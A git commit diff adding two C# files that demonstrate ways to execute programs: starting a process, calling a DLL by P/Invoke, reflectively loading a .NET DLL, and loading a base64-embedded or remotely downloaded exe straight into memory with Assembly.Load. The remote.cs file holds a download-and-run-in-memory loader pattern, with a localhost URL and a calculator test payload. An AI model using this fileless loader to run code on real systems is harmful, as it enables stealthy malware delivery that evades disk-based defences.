ce774b7a654578047e85339baec9b753978bcf75
echo0d <echo0d@163.com>
2024-12-09 18:05:26 +0800

    C#执行exe/dll

---
+++ PEExecute/CsharpExecutor/CsharpExecutor/local.cs
@@ -0,0 +1,56 @@
+﻿using System;
+using System.Diagnostics;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+namespace CsharpExecutor
+{
+    public class Local
+    {
+        public static void ExeExecutor()
+        {
+            // 1. 执行本地exe文件，使用Process.start()
+            // 需要执行的文件有参数的话，可以写像下面的processStartInfo，没有参数就执行写文件路径就行。
+            string filename = "explorer.exe";
+            string arguments = @"C:/";
+            ProcessStartInfo processStartInfo = new ProcessStartInfo();
+            processStartInfo.FileName = filename;
+            processStartInfo.Arguments = arguments;
+            Process.Start(processStartInfo);
+        }
+
+        // 2. 执行本地dll文件
+        public static void DllExecutor()
+        {
+            [DllImport("user32.dll", CharSet = CharSet.Auto)]
+            static extern int MessageBox(IntPtr hWnd, String text, String caption, uint type);
+
+            MessageBox(IntPtr.Zero, "Hello from user32.dll!", "DLL Message", 0);
+        }
+
+        // 3.反射加载exe、dll文件(仅限.NET程序集)
+        public static void ReflectDllExecutor()
+        {
+            // 加载 DLL 文件
+            Assembly assembly = Assembly.LoadFile(@"C:\Users\echo0d\Desktop\CsharpExecutor\CsharpExecutor\testcalc.dll"); //要绝对路径
+            // 获取 DLL 中的类型
+            Type type = assembly.GetType("loadCalc.aaa"); //必须使用名称空间+类名称
+            
+            // 调用类型中的方法
+            MethodInfo method = type.GetMethod("bbb"); 
+            if (method != null)
+            {
+                Object obj = assembly.CreateInstance(method.Name);     
+                /*// 定义方法参数
+                object[] parameters = { "Parameter1", 123 }; // 替换为实际参数值
+                // 调用方法并传递参数
+                method.Invoke(obj, parameters);*/
+                method.Invoke(obj, null);
+            }
+            else
+            {
+                Console.WriteLine("Method not found.");
+            }
+        }
+    }
+}
---
+++ PEExecute/CsharpExecutor/CsharpExecutor/remote.cs
@@ -0,0 +1,38 @@
+﻿using System;
+using System.Net;
+using System.Reflection;
+
+namespace CsharpExecutor
+{
+    public class remote
+    {
+        public static void MemoryExecutor()
+        {
+            // 方法1. 把exe文件给base64编码，然后保存在一个常量里, 转成byte数组，放到Assembly.Load函数里
+            string base64String = Constants.Base64Exe;
+            byte[] buffer = Convert.FromBase64String(base64String);
+
+            // 方法2. 远程下载exe，赋值给一个字符串类型的变量
+            // byte[] buffer = GetRemoteByte("http://127.0.0.1:8000/testcalc.exe");
+            
+            // 这里的Assembly.Load可以读取字符串形式的程序集，也就是说exe文件不需要写入硬盘
+            Assembly assembly = Assembly.Load(buffer);
+            // 以exe为例，如果是dll文件就必须指定类名函数名
+            MethodInfo method = assembly.EntryPoint;
+            method.Invoke(null, null);
+            // 想要指定参数
+            // object[] parameters = new[] {"-a","-b"};
+            // method.Invoke(null, parameters);
+        }
+        
+        
+        private static byte[] GetRemoteByte(string serviceUrl)
+        {
+            WebClient client = new WebClient();
+            byte[] buffer = client.DownloadData(serviceUrl);
+            return buffer;
+        }
+        
+    }
+    
+}
